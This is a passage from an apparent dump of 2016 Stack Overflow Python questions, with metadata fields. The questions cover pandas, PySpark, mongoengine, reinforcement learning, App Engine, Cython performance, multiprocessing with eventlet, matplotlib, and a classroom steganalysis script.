<p>Here's another model <code>Error</code></p>

<pre class=""lang-py prettyprint-override""><code>from mongoengine import *
from datetime import datetime


class Error(Document):
    call = DictField(required=True)
    response = DictField(required=True)
    date = DateTimeField(default=datetime.now(), required=True)

    meta = {
        'collection': 'errors'
    }
</code></pre>

<p>Here's the file which I'm using to test the code:</p>

<pre class=""lang-py prettyprint-override""><code>from src.social.models.error import Error
from src.social.models.user import User

error = Error.objects.first()

print(error.to_json())
</code></pre>

<p>But it doesn't work, throws the following error:</p>

<pre><code>AttributeError: 'Error' object has no attribute 'platform'
</code></pre>

<p>Please help me with this, thanks.</p>
"
39816795,3601042.0,2016-10-02 12:03:14+00:00,3,How to add a specific number of characters to the end of string in Pandas?,"<p>I am using the Pandas library within Python and I am trying to increase the length of a column with text in it to all be the same length. I am trying to do this by adding a specific character (this will be white space normally, in this example I will use ""_"") a number of times until it reaches the maximum length of that column. </p>

<p>For example:</p>

<p><strong>Col1_Before</strong></p>

<pre><code>A
B
A1R
B2
AABB4
</code></pre>

<p><strong>Col1_After</strong></p>

<pre><code>A____
B____
A1R__
B2___
AABB4
</code></pre>

<p>So far I have got this far (using the above table as the example). It is the next part (and the part that does it that I am stuck on).</p>

<pre><code>df['Col1_Max'] = df.Col1.map(lambda x: len(x)).max()
df['Col1_Len'] = df.Col1.map(lambda x: len(x))
df['Difference_Len'] = df ['Col1_Max'] - df ['Col1_Len']
</code></pre>

<p>I may have not explained myself well as I am still learning. If this is confusing let me know and I will clarify. </p>
"
40006395,3984270.0,2016-10-12 19:01:10+00:00,3,Applying UDFs on GroupedData in PySpark (with functioning python example),"<p>I have this python code that runs locally in a pandas dataframe:</p>

<pre><code>df_result = pd.DataFrame(df
                          .groupby('A')
                          .apply(lambda x: myFunction(zip(x.B, x.C), x.name))
</code></pre>

<p>I would like to run this in PySpark, but having trouble dealing with pyspark.sql.group.GroupedData object.</p>

<p>I've tried the following:</p>

<pre><code>sparkDF
 .groupby('A')
 .agg(myFunction(zip('B', 'C'), 'A')) 
</code></pre>

<p>which returns</p>

<pre><code>KeyError: 'A'
</code></pre>

<p>I presume because 'A' is no longer a column and I can't find the equivalent for x.name.</p>

<p>And then</p>

<pre><code>sparkDF
 .groupby('A')
 .map(lambda row: Row(myFunction(zip('B', 'C'), 'A'))) 
 .toDF()
</code></pre>

<p>but get the following error:</p>

<pre><code>AttributeError: 'GroupedData' object has no attribute 'map'
</code></pre>

<p>Any suggestions would be really appreciated!</p>
"
39740814,6892051.0,2016-09-28 07:30:35+00:00,3,How to find parenthesis bound strings in python,"<p>I'm learning Python and wanted to automate one of my assignments in a cybersecurity class.
I'm trying to figure out how I would look for the contents of a file that are bound by a set of parenthesis. The contents of the (.txt) file look like:</p>

<pre><code>cow.jpg : jphide[v5](asdfl;kj88876)
fish.jpg : jphide[v5](65498ghjk;0-)
snake.jpg : jphide[v5](poi098*/8!@#)
test_practice_0707.jpg : jphide[v5](sJ*=tT@&amp;Ve!2)
test_practice_0101.jpg : jphide[v5](nKFdFX+C!:V9)
test_practice_0808.jpg : jphide[v5](!~rFX3FXszx6)
test_practice_0202.jpg : jphide[v5](X&amp;aC$|mg!wC2)
test_practice_0505.jpg : jphide[v5](pe8f%yC$V6Z3)
dog.jpg : negative`
</code></pre>

<p>And here is my code so far:
</p>

<pre><code>import sys, os, subprocess, glob, shutil

# Finding the .jpg files that will be copied.
sourcepath = os.getcwd() + '\\imgs\\'
destpath = 'stegdetect'
rawjpg = glob.glob(sourcepath + '*.jpg')

# Copying the said .jpg files into the destpath variable
for filename in rawjpg:
    shutil.copy(filename, destpath)

# Asks user for what password file they want to use.
passwords = raw_input(""Enter your password file with the .txt extension:"")
shutil.copy(passwords, 'stegdetect')

# Navigating to stegdetect. Feel like this could be abstracted.
os.chdir('stegdetect')

# Preparing the arguments then using subprocess to run
args = ""stegbreak.exe -r rules.ini -f "" + passwords + "" -t p *.jpg""

# Uses open to open the output file, and then write the results to the file.
with open('cracks.txt', 'w') as f: # opens cracks.txt and prepares to w
        subprocess.call(args, stdout=f)

# Processing whats in the new file.
f = open('cracks.txt')
</code></pre>
"
39981237,7002103.0,2016-10-11 15:40:23+00:00,3,Comparing numbers give the wrong result in Python,"<p>sorry if this is a terrible question, but I am really new to programming. I am attempting a short little test program.</p>

<p>If I enter any value less than 24, it does print the ""You will be old..."" statement. If I enter any value greater than 24 (ONLY up to 99), it prints the ""you are old"" statement.</p>

<p>The problem is if you enter a value of 100 or greater, it prints the ""You will be old before you know it."" statement.</p>

<pre><code>print ('What is your name?')
myName = input ()
print ('Hello, ' + myName)
print ('How old are you?, ' + myName)
myAge = input ()
if myAge &gt; ('24'):
     print('You are old, ' + myName)
else:
     print('You will be old before you know it.')
</code></pre>
"
39703241,4127330.0,2016-09-26 12:45:56+00:00,3,Read and parse a file of tokens?,"<p><strong>EDIT</strong>: <em>I have edited the question to correct a major mistake (which unfortunately invalidates all the answers provided so far): the command lines can contain spaces between the words, so no solution based on using spaces as delimiters between the tokens and their parameters will work! I deeply apologize for this omission in my original post.</em></p>

<p>I have a text file containing commands in a simple (hypothetical) command language, as follows:</p>

<pre><code>$BOOLEAN_COMMAND

$NUMERIC COMMAND ALPHA 1 3 6 9 10

$NUMERIC COMMAND BETA
2 7 9 10 15
25 40 900 2000
$NUMERIC COMMAND GAMMA 6 9 11
</code></pre>

<p>1) Each ""COMMAND"" starts with a special character ('$') and may be followed by a sequence of digits (the ""command parameters"").</p>

<p>2) Commands without parameters are considered ""boolean commands"" and assume by default a value of True.</p>

<p>3) There can be many commands with parameters (I call them here ""Alpha"", ""Beta"", etc.), but no matter their names, all are followed by one of more lines containing parameters.</p>

<p>4) There may or may not be blank lines between lines contaning commands.</p>

<p>I wrote a function which reads a file containing said commands and parameters and returns only the parameters of a specific command (passed as a function parameter). Here it is:</p>

<pre><code>def get_params(fname, command):
    fspecs = open(fname,""r"")

    params = []
    for cline in fspecs:
        cline = cline.strip()
        if not cline:
            continue     # Blank line
        if cline.startswith('$'):
            if command in cline:
                params = cline.partition(command)[-1].split()
        #else:    # Continuation of a command.
        #    params.append(cline)
    fspecs.close()

    if len(params) == 0: # Boolean command, defaults to True
        ret_val = True
    else:
        ret_val = ' '.join(params) # Numeric command, gets parameters
    return ret_val

p = get_params('command_file', '$BOOLEAN COMMAND')
print p # returns True
p = get_params('command_file', '$NUMERIC COMMAND ALPHA')
print p # returns 1 3 6 9 10
p = get_params('command_file', '$NUMERIC COMMAND BETA')
print p # should return 2 7 9 10 15, but returns True
</code></pre>

<p>The above code works when the parameters of a given command are in a single line (immediately after the command token), but fails when the parameters are in subsequent lines (in that case, it just returns 'True' because no parameters are found after the command token). If the 'else' clause is not commented out, it just takes all lines containing parameters of whatever tokens there are up to the end of the file. Actually running the above code will better demonstrate the problem.</p>

<p>What I want is being able to read one specific token (passed to the function) and get only its parameters, no matter if they extend into several lines or how many other tokens there may be in the command file.</p>
"
39776890,1715453.0,2016-09-29 17:49:27+00:00,3,Skew a diagonal gradient to be vertical,"<p>I have a not-quite linear gradient at some angle to the horizontal as an image. Here's some toy data:</p>

<pre><code>g = np.ones((5,20))
for x in range(g.shape[0]):
    for y in range(g.shape[1]):
        g[x,y] += (x+y)*0.1+(y*0.01)
</code></pre>

<p><a href=""http://i.stack.imgur.com/ytcp6.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/ytcp6.png"" alt=""diagonal gradient""></a></p>

<p>I want to essentially correct the skew in the gradient so that it is horizontal, i.e. the gradient increases to the right and all vertical slices are constant.</p>

<p>This will of course produce a parallelogram with a larger x-axis than the input image. Returning a masked Numpy array would be ideal. Here's a (terrible) cartoon to quickly illustrate.</p>

<p><a href=""http://i.stack.imgur.com/QVtG7.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/QVtG7.png"" alt=""enter image description here""></a></p>

<p>Any idea how to achieve this? Thanks!</p>
"
40006763,6820417.0,2016-10-12 19:23:48+00:00,3,"Sarsa algorithm, why Q-values tend to zero?","<p>I'm trying to implement Sarsa algorithm for solving a Frozen Lake environment from OpenAI gym. I've started soon to work with this but I think I understand it. </p>

<p>I also understand how Sarsa algorithm works, there're many sites where to find a pseudocode, and I get it. I've implemented this algorithm in my problem following all the steps, but when I check the final Q function after all the episodes I notice that all values tend to zero and I don't know why.</p>

<p>Here is my code, I hope someone can tell me why that happens.</p>

<pre><code>import gym
import random
import numpy as np

env = gym.make('FrozenLake-v0')

#Initialize the Q matrix 16(rows)x4(columns)
Q = np.zeros([env.observation_space.n, env.action_space.n])

for i in range(env.observation_space.n):
    if (i != 5) and (i != 7) and (i != 11) and (i != 12) and (i != 15):
        for j in range(env.action_space.n):
            Q[i,j] = np.random.rand()

#Epsilon-Greedy policy, given a state the agent chooses the action that it believes has the best long-term effect with probability 1-eps, otherwise, it chooses an action uniformly at random. Epsilon may change its value.

bestreward = 0
epsilon = 0.1
discount = 0.99
learning_rate = 0.1
num_episodes = 50000
a = [0,0,0,0,0,0,0,0,0,0]

for i_episode in range(num_episodes):

    # Observe current state s
    observation = env.reset()
    currentState = observation

    # Select action a using a policy based on Q
    if np.random.rand() &lt;= epsilon: #pick randomly
        currentAction = random.randint(0,env.action_space.n-1)
    else: #pick greedily            
        currentAction = np.argmax(Q[currentState, :])

    totalreward = 0
    while True:
        env.render()

        # Carry out an action a 
        observation, reward, done, info = env.step(currentAction)
        if done is True:
            break;

        # Observe reward r and state s'
        totalreward += reward
        nextState = observation

        # Select action a' using a policy based on Q
        if np.random.rand() &lt;= epsilon: #pick randomly
            nextAction = random.randint(0,env.action_space.n-1)
        else: #pick greedily            
            nextAction = np.argmax(Q[nextState, :])

        # update Q with Q-learning 
        Q[currentState, currentAction] += learning_rate * (reward + discount * Q[nextState, nextAction] - Q[currentState, currentAction])

        currentState = nextState
        currentAction = nextAction

        print ""Episode: %d reward %d best %d epsilon %f"" % (i_episode, totalreward, bestreward, epsilon)
        if totalreward &gt; bestreward:
            bestreward = totalreward
        if i_episode &gt; num_episodes/2:
            epsilon = epsilon * 0.9999
        if i_episode &gt;= num_episodes-10:
            a.insert(0, totalreward)
            a.pop()
        print a

        for i in range(env.observation_space.n):
            print ""-----""
            for j in range(env.action_space.n):
                print Q[i,j]
</code></pre>
"
40031406,28360.0,2016-10-13 21:35:28+00:00,3,How can I find all known ingredient strings in a block of text?,"<p>Given a string of ingredients:</p>



<pre class=""lang-python prettyprint-override""><code>text = """"""Ingredients: organic cane sugar, whole-wheat flour,
       mono &amp; diglycerides. Manufactured in a facility that uses nuts.""""""
</code></pre>

<p>How can I extract the ingredients from my postgres database, or find them in my elasticsearch index, without matching tokens like <code>Ingredients:</code> or <code>nuts</code>?</p>

<p>The expected output would be:</p>

<pre class=""lang-python prettyprint-override""><code>ingredients = process(text)
# ['cane sugar', 'whole wheat flour', 'mono diglycerides']
</code></pre>
"
39817482,6255128.0,2016-10-02 13:24:48+00:00,3,contact form on google app engine,"<p>I have a website running on google app engine and would like to include a contact form. 
My app.yaml looks like this:</p>

<pre><code>version: 1  
runtime: python27 
api_version: 1 
threadsafe: true

 handlers:
 - url: /      
   static_files: www/index.html
   upload: www/index.html

 - url: /(.*)      
   static_files: www/\1
   upload: www/(.*)
</code></pre>

<p>which is working fine for the static files, but how can i include the py file for the contact form?</p>

<p>I already tried to run it with this app.yaml file:</p>

<pre><code>version: 1  
runtime: python27 
api_version: 1 
threadsafe: true

libraries:
 - name: jinja2 
   version: latest

 - name: webapp2  
   version: latest

 handlers:
 - url: /      
   static_files: www/index.html
   upload: www/index.html

 - url: /(.*)      
   static_files: www/\1
   upload: www/(.*)

 - url: /.*   
   script: www/contactForm.app
</code></pre>

<p>but it didn't work, e-mail isn't sent 
my py file looks like this:</p>

<pre><code>import webapp2
import jinja2
import os
from google.appengine.api import mail

jinja_environment = jinja2.Environment(autoescape=True,loader=jinja2.FileSystemLoader(os.path.join(os.path.dirname(__file__), 'templates')))

class contact(webapp2.RequestHandler):
template = jinja_environment.get_template('contact.html')
def get(self):
self.response.out.write(self.template.render())
def post(self):

# takes input from user
vorname=self.request.get(""vorname"")
...

message=mail.EmailMessage(sender=""authorized sender address"",subject=""Kontaktformular"")

if not mail.is_email_valid(userMail):
  self.response.out.write(""Wrong email! Check again!"")

message.to=""...""
message.body="""""" Hallo:
     Vorname: %s
     ...
     Text: %s"""""" %(vorname,...,text)
message.send()
self.response.out.write(""Message sent!"")

app = webapp2.WSGIApplication([('/contact',contact)], debug=True)
</code></pre>

<p>Does someone know how to make it work?</p>
"
40025238,596041.0,2016-10-13 15:32:05+00:00,3,"Given only source file, what files does it import?","<p>I'm building a dependency graph in python3 using the <code>ast</code> module. How do I know what file(s) will be imported if that import statement were to be executed?</p>
"
39818559,2336654.0,2016-10-02 15:29:22+00:00,3,retrieve series of slices of column headers based on truth of dataframe values,"<p>consider the dataframe <code>df</code></p>

<pre><code>np.random.seed([3,1415])
df = pd.DataFrame(np.random.choice((0, 1), (3, 3)),
                  columns=['blah', 'meep', 'zimp'])
df
</code></pre>

<p><a href=""http://i.stack.imgur.com/H2ovB.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/H2ovB.png"" alt=""enter image description here""></a></p>

<hr>

<p><strong><em>question</em></strong><br>
what is the most efficient way to slice <code>df.columns</code> with each row of <code>df</code>?<br>
(for this example and at scale)</p>

<p><strong><em>expected results</em></strong></p>

<pre><code>0          [meep]
1          [blah]
2    [blah, zimp]
dtype: object
</code></pre>

<hr>

<h1>At Scale</h1>

<p>I confirmed that @jezrael, @boud, and my answer all produce the same results.  Below is the dataframe I used to test the scale of each solution</p>

<pre><code>from string import letters
import pandas as pd
import numpy as np

mux = pd.MultiIndex.from_product([list(letters), list(letters)])

df = pd.DataFrame(np.arange(52 ** 4).reshape(52 ** 2, -1) % 3 % 2, mux, mux)
</code></pre>

<p><strong><em>setup for boud</em></strong>  </p>

<pre><code>s = pd.Series([[x] for x in df], df.columns)
</code></pre>

<p><strong><em>setup for pirsquared</em></strong></p>

<pre><code>num = df.columns.nlevels
lvls = list(range(num))
rlvls = [x * -1 - 1 for x in lvls]
xsl = lambda x: x.xs(x.name).index.tolist()
</code></pre>

<p><strong><em>results</em></strong>  </p>

<p><a href=""http://i.stack.imgur.com/HIHqb.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/HIHqb.png"" alt=""enter image description here""></a></p>

<p><strong><em>small df</em></strong>  </p>

<p><a href=""http://i.stack.imgur.com/s0ZYx.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/s0ZYx.png"" alt=""enter image description here""></a></p>
"
39742127,854988.0,2016-09-28 08:36:43+00:00,3,High performance all-to-all comparison of vectors in Python,"<p>First to tell about the background: several methods for comparison between clusterings relies on so called pair counting. We have two vectors of flat clusterings <code>a</code> and <code>b</code> over the same <code>n</code> entities. At pair counting for all possible pairs of entities we check whether if those belong to the same cluster in both, or to the same in <code>a</code> but different in <code>b</code>, or the opposite, or to different clusters in both. This way we get 4 counts, let's call them <code>n11, n10, n01, n00</code>. These are input for different metrics.</p>

<p>When the number of entities is around 10,000, and the number of clusterings to compare is dozens or more, the performance becomes an issue, as the number of pairs is <code>10^8</code> for each comparison, and for an all-to-all comparison of clusterings this needs to be performed <code>10^4</code> times.</p>

<p>With a naive Python implementation it took really forever, so I turned to Cython and numpy. This way I could push the time for one comparison down to around <code>0.9-3.0</code> seconds. Which still means half day runtime in my case. I am wondering if you see any possibility for performance achievement, with some clever algorithm or C library, or whatever.</p>

<p>Here are my attempts:</p>

<p>1) This counts without allocating huge arrays for all the pairs, takes 2 membership vectors <code>a1, a2</code> of length <code>n</code>, and returns the counts:</p>

<pre><code>cimport cython
import numpy as np
cimport numpy as np

ctypedef np.int32_t DTYPE_t

@cython.boundscheck(False)
def pair_counts(
    np.ndarray[DTYPE_t, ndim = 1] a1,
    np.ndarray[DTYPE_t, ndim = 1] a2,
    ):

    cdef unsigned int a1s = a1.shape[0]
    cdef unsigned int a2s = a2.shape[0]

    cdef unsigned int n11, n10, n01, n00
    n11 = n10 = n01 = n00 = 0
    cdef unsigned int j0

    for i in range(0, a1s - 1):
        j0 = i + 1
        for j in range(j0, a2s):
            if a1[i] == a1[j] and a2[i] == a2[j]:
                n11 += 1
            elif a1[i] == a1[j]:
                n10 += 1
            elif a2[i] == a2[j]:
                n01 += 1
            else:
                n00 += 1

    return n11, n10, n01, n00
</code></pre>

<p>2) This first calculates comembership vectors (length <code>n * (n-1) / 2</code>, one element for each entity pair) for each of the 2 clusterings, then calculates the counts from these vectors. It allocates ~20-40M memory at each comparison, but interestingly, faster than the previous. Note: <code>c</code> is a wrapper class around a clustering, having the usual membership vector, but also a <code>c.members</code> dict which contains the indices of entities for each cluster in numpy arrays.</p>

<pre><code>cimport cython
import numpy as np
cimport numpy as np

@cython.boundscheck(False)
def comembership(c):
    """"""
    Returns comembership vector, where each value tells if one pair
    of entites belong to the same group (1) or not (0).
    """"""
    cdef int n = len(c.memberships)
    cdef int cnum = c.cnum
    cdef int ri, i, ii, j, li

    cdef unsigned char[:] cmem = \
        np.zeros((int(n * (n - 1) / 2), ), dtype = np.uint8)

    for ci in xrange(cnum):
        # here we use the members dict to have the indices of entities
        # in cluster (ci), as a numpy array (mi)
        mi = c.members[ci]
        for i in xrange(len(mi) - 1):
            ii = mi[i]
            # this is only to convert the indices of an n x n matrix
            # to the indices of a 1 x (n x (n-1) / 2) vector:
            ri = n * ii - 3 * ii / 2 - ii ** 2 / 2 - 1
            for j in mi[i+1:]:
                # also here, adding j only for having the correct index
                li = ri + j
                cmem[li] = 1

    return np.array(cmem)

def pair_counts(c1, c2):
    p1 = comembership(c1)
    p2 = comembership(c2)
    n = len(c1.memberships)

    a11 = p1 * p2

    n11 = a11.sum()
    n10 = (p1 - a11).sum()
    n01 = (p2 - a11).sum()
    n00 = n - n10 - n01 - n11

    return n11, n10, n01, n00
</code></pre>

<p>3) This is a pure numpy based solution with creating an <code>n x n</code> boolean array of comemberships of entity pairs. The inputs are the membership vectors (<code>a1, a2</code>).</p>

<pre><code>def pair_counts(a1, a2):

    n = len(a1)
    cmem1 = a1.reshape([n,1]) == a1.reshape([1,n])
    cmem2 = a2.reshape([n,1]) == a2.reshape([1,n])

    n11 = int(((cmem1 == cmem2).sum() - n) / 2)
    n10 = int((cmem1.sum() - n) / 2) - n11
    n01 = int((cmem2.sum() - n) / 2) - n11
    n00 = n - n11 - n10 - n01

    return n11, n10, n01, n00
</code></pre>

<p><strong>Edit:</strong> example data</p>

<pre><code>import numpy as np

a1 = np.random.randint(0, 1868, 14440, dtype = np.int32)
a2 = np.random.randint(0, 484, 14440, dtype = np.int32)

# to have the members dicts used in example 2:
def get_cnum(a):
    """"""
    Returns number of clusters.
    """"""
    return len(np.unique(a))

def get_members(a):
    """"""
    Returns a dict with cluster numbers as keys and member entities
    as sorted numpy arrays.
    """"""
    members = dict(map(lambda i: (i, []), range(max(a) + 1)))
    list(map(lambda m: members[m[1]].append(m[0]),
        enumerate(a)))
    members = dict(map(lambda m:
       (m[0], np.array(sorted(m[1]), dtype = np.int)),   
       members.items()))
    return members

members1 = get_members(a1)
members2 = get_members(a2)
cnum1 = get_cnum(a1)
cnum2 = get_cnum(a2)
</code></pre>
"
39774826,5110870.0,2016-09-29 15:50:38+00:00,3,Pandas: how to draw a bar plot with two categories and four series each?,"<p>I have the following dataframe, where <code>pd.concat</code> has been used to group the columns:</p>

<pre><code>    a               b            
   C1  C2  C3  C4  C5  C6  C7  C8
0  15  37  17  10   8  11  19  86
1  39  84  11   5   5  13   9  11
2  10  20  30  51  74  62  56  58
3  88   2   1   3   9   6   0  17
4  17  17  32  24  91  45  63  48
</code></pre>

<p>Now I want to draw a bar plot where I only have two categories (<code>a</code> and <code>b</code>), and each category has four bars representing the average of each column. Columns C1 and C5 should have the same color, as should columns C2 and C6, and so forth. </p>

<p><strong>How can I do it with <em>df.plot.bar()?</em></strong></p>

<p>The plot should resemble the following image. Sorry for it being hand-drawn but it was very hard for me to find a relevant example:
<a href=""http://i.stack.imgur.com/8I1Z6.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/8I1Z6.jpg"" alt=""enter image description here""></a></p>

<p><strong>EDIT</strong></p>

<p>This is the header of my actual DataFrame:</p>

<pre><code>    C1  C2  C3  C4  C5  C6  C7  C8
0   34  34  34  34  6   40  13  26
1   19  19  19  19  5   27  12  15
2   100 100 100 100 0   0   0   0
3   0   0   0   0   0   0   0   0
4   100 100 100 100 0   0   0   0
</code></pre>
"
40058748,2102328.0,2016-10-15 11:59:36+00:00,3,Using multiple cores with Python and Eventlet,"<p>I have a Python web application in which the client (<a href=""http://emberjs.com/"" rel=""nofollow"">Ember.js</a>) communicates with the server via WebSocket (I am using <a href=""https://flask-socketio.readthedocs.io/en/latest/"" rel=""nofollow"">Flask-SocketIO</a>). 
Apart from the WebSocket server the backend does two more things that are worth to be mentioned:</p>

<ul>
<li>Doing some image conversion (using <a href=""http://www.graphicsmagick.org/"" rel=""nofollow"">graphicsmagick</a>)</li>
<li>OCR incoming images from the client (using <a href=""https://github.com/tesseract-ocr"" rel=""nofollow"">tesseract</a>)</li>
</ul>

<p>When the client submits an image its entity is created in the database and the id is put in an image conversion queue. The worker grabs it and does image conversion. After that the worker puts it in the OCR queue where it will be handled by the OCR queue worker.</p>

<p>So far so good. The WS requests are handled synchronously in separate threads (Flask-SocketIO uses Eventlet for that) and the heavy computational action happens asynchronously (in separate threads as well).</p>

<p>Now the problem: the whole application runs on a <strong>Raspberry Pi 3</strong>. If I do not make use of the 4 cores it has I only have <strong>one ARMv8 core clocked at 1.2 GHz</strong>. This is very little power for OCR. So I decided to find out how to use multiple cores with Python. Although I read about the problems with the <a href=""http://www.infoworld.com/article/3079037/open-source-tools/multicore-python-a-tough-worthy-and-reachable-goal.html"" rel=""nofollow"">GIL</a>) I found out about <a href=""https://docs.python.org/2/library/multiprocessing.html"" rel=""nofollow"">multiprocessing</a> where it says <code>The multiprocessing package offers both local and remote concurrency, effectively side-stepping the Global Interpreter Lock by using subprocesses instead of threads.</code>. Exactly what I wanted. So I instantly replaced the </p>

<pre><code>from threading import Thread
thread = Thread(target=heavy_computational_worker_thread)
thread.start()
</code></pre>

<p>by</p>

<pre><code>from multiprocessing import Process
process = Process(target=heavy_computational_worker_thread)
process.start()
</code></pre>

<p>The queue needed to be handled by the multiple cores as well So i had to change</p>

<pre><code>from queue import Queue
queue = multiprocessing.Queue()
</code></pre>

<p>to</p>

<pre><code>import multiprocessing
queue = multiprocessing.Queue()
</code></pre>

<p>as well. Problematic: the queue and the Thread libraries are <a href=""http://eventlet.net/doc/patching.html"" rel=""nofollow"">monkey patched</a> by Eventlet. If I stop using the monkey patched version of Thread and Queue and use the one from <code>multiprocsssing</code> instead then the request thread started by Eventlet blocks forever when accessing the queue.</p>

<p>Now my question:</p>

<p><strong>Is there any way I can make this application do the OCR and image conversion on a separate core?</strong></p>

<p>I would like to keep using WebSocket and Eventlet if that's possible. The advantage I have is that the only communication interface between the processes would be the queue. </p>

<p>Ideas that I already had:
 - Not using a Python implementation of a queue but rather using I/O. For example a dedicated Redis which the different subprocesses would access
 - Going a step further: starting every queue worker as a separate Python process (e.g. python3 wsserver | python3 ocrqueue | python3 imgconvqueue). Then I would have to make sure myself that the access on the queue and on the database would be non-blocking</p>

<p>The best thing would be to keep the single process and make it work with multiprocessing, though.</p>

<p>Thank you very much in advance</p>
"
40106468,4474498.0,2016-10-18 11:01:36+00:00,3,Python escape sequence complex output,"<p>When I am writing the following command in Python IDLE it will give you the output with quotes, I want to know why it is giving such output.</p>

<pre><code>x='''''abc\'abcddd'''''

print x
</code></pre>

<p>This is output of the written code.</p>

<pre><code>''abc'abcddd
</code></pre>
"
40008155,875667.0,2016-10-12 20:52:32+00:00,3,"How to find methods which are only defined in a subclass, in Python 2.7?","<p>Is there a clean way to get methods only defined in a subclass that not defined in parent class?</p>

<pre><code>class Parent(object):
     def method_of_parent(self):
         pass
class SubClass(Parent):
     def method_of_subclass(self):
         pass

# desired:
&gt;&gt;&gt; print(get_subclass_methods(SubClass))
['method_of_subclass',]
</code></pre>
"
39765264,4661552.0,2016-09-29 08:31:56+00:00,3,"Display values that does not end with "".0"" Python Pandas","<p>I have a float column that contains <code>NaN</code> values and float values. How do i filter out those values that does not end with <code>.0</code>?</p>

<p>For example:</p>

<pre><code>Col1
0.7
1.0
1.1
9.0
9.5
NaN
</code></pre>

<p>Desire result will be:</p>

<pre><code>Col1
0.7
1.1 
9.2
</code></pre>
"
39615948,6025342.0,2016-09-21 11:58:17+00:00,3,Does PyCharm Debugger have a 'goto' option?,"<p>For example, I have a breakpoint at <code>print('c')</code> and when the programs pauses I want to <em>jump</em> to <code>print('f')</code> (without executing <code>print('d')</code> and <code>print('e')</code>). Is that possible?</p>

<p><a href=""http://i.stack.imgur.com/ngeXS.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/ngeXS.png"" alt=""debugging example""></a></p>

<p>PyCharm Version is: 2016.2.3, Community Edition.</p>
"
39812385,4712455.0,2016-10-01 23:19:39+00:00,3,SQLALchemy - a list attribute (or problematic? FK table),"<p>My data feed looks like this:</p>

<pre><code>{['item_id': 1, ... 'price': 123, ... ],
 ['item_id': 1, ... 'price': 124, ... modifiers: [1, 2, 3],
 ['item_id': 1, ... 'price': 125, ... modifiers: [100, 150, 500 ... ],
 ['item_id': 2, ... 'price': 200, ...],
 ...}
</code></pre>

<p>Those are basically some <code>item</code>s that can be modified - think of it as a car that can be modified with extra stuff (e.g. AC, electronic windows etc), but can be sold on its own too, along with their prices in an auction.</p>

<p>My (current) <code>item</code> class look like this:</p>

<pre><code>class Item(Base):
    __tablename__ = 'items'

    id = Column(Integer, primary_key=True)
    name = Column(String)
    price = Column(Integer)
</code></pre>

<p>I'm not sure how to capture the <code>modifiers</code> there. I know I can create a <code>Modifier</code>eg:</p>

<pre><code>class Modifier(Base):
    __tablename__ = 'modifiers'

    id = Column(Integer, primary_key=True)
</code></pre>

<p>But then how do I achieve the following:</p>

<p>1) The tables would have to be many-to-many relationship as any modifier can be applied to any item, and any item can have multiple modifiers.</p>

<p>2) <strong>More importantly</strong> - I need to differentiate <code>['item_id': 1, ... ]</code> from <code>['item_id': 1, ... , modifiers: [1, 2, 3]</code> relatevely efficiently (I would be potentially scanning hundreds of millions of such items a day).</p>

<p><strong>*End-goal*:</strong></p>

<p>Keep a price histogram of what each of those items (base item &amp; modification combination) 'go for'. It's not a simple ""base item price"" + ""price of each modifier"", because for instance some items are no longer in production, yet the value of the base item would be higher than value of the modified item. Hence I need to quickly identify which item &amp; modifiers combination are we talking about, and assign a current price to it.</p>

<p><strong>*End-goal 2*:</strong></p>

<p>Knowing the average price of what the item goes for, being able to efficiently determine whether it is worth buying. By efficiently, I mean really mean efficiently, because as I said, it would potentially be hundreds of millions of different auctions a day and so it is not really feasible to do something like:</p>

<pre><code>buy_list = []

for a in auctions:
    item_id = a['item_id'] #not good. this doesn't include modifiers
    price = a['price']

    #way too slow I think. If 10^8 auctions, would create a 10^8 calls to db.
    buy_price = some_query(item_id) 

    if buy_price &lt; price:
        buy_list.append(a)
</code></pre>
"
39752729,2336654.0,2016-09-28 16:15:36+00:00,3,convenient way to reindex one level of a multiindex,"<p>consider the <code>pd.Series</code> <code>s</code> and <code>pd.MultiIndex</code> <code>idx</code></p>

<pre><code>idx = pd.MultiIndex.from_product([list('AB'), [1, 3], list('XY')],
                                 names=['one', 'two', 'three'])
s = pd.Series(np.arange(8), idx)
s

one  two  three
A    1    X        0
          Y        1
     3    X        2
          Y        3
B    1    X        4
          Y        5
     3    X        6
          Y        7
dtype: int32
</code></pre>

<p>I want to <code>reindex</code> on <code>level='two'</code> with <code>np.arange(4)</code><br>
I can do it with:</p>

<pre><code>s.unstack([0, 2]).reindex(np.arange(4), fill_value=0).stack().unstack([0, 1])

one  two  three
A    0    X        0
          Y        0
     1    X        0
          Y        1
     2    X        0
          Y        0
     3    X        2
          Y        3
B    0    X        0
          Y        0
     1    X        4
          Y        5
     2    X        0
          Y        0
     3    X        6
          Y        7
dtype: int32
</code></pre>

<p>But I'm looking for something more direct if it exists.  Any ideas?</p>
"
39793508,3556061.0,2016-09-30 14:09:50+00:00,3,Python -Two figures in one plot,"<p>I have two python plot functions:  </p>

<pre><code>def plotData(data):
    fig, ax = plt.subplots()
    results_accepted = data[data['accepted'] == 1]
    results_rejected = data[data['accepted'] == 0]
    ax.scatter(results_accepted['exam1'], results_accepted['exam2'], marker='+', c='b', s=40)
    ax.scatter(results_rejected['exam1'], results_rejected['exam2'], marker='o', c='r', s=30)
    ax.set_xlabel('Exam 1 score')
    ax.set_ylabel('Exam 2 score')
    return ax
</code></pre>

<p>And second function is:</p>

<pre><code>def plot_boundry(theta,x):
    """"""
    """"""
    plt.figure(1)
    px = np.array([x[:, 1].min() - 2, x[:, 1].max() + 2])
    py = (-1 / theta[2]) * (theta[1] * px + theta[0])
    fig, ax = plt.subplots()
    ax.plot(px, py)
    return ax
</code></pre>

<p>And i am calling both :</p>

<pre><code>#####PLOT ######
ax = plotData(df)
ax = plot_boundry(opt_theta, x)
</code></pre>

<p>I get 2 separate plots:<br>
<a href=""http://i.stack.imgur.com/j60xl.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/j60xl.png"" alt=""enter image description here""></a></p>

<p><a href=""http://i.stack.imgur.com/GszfC.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/GszfC.png"" alt=""enter image description here""></a></p>

<p>I got 2 separate picture.How Do I add two plot into one.
Both the plot should be one plot.</p>
"
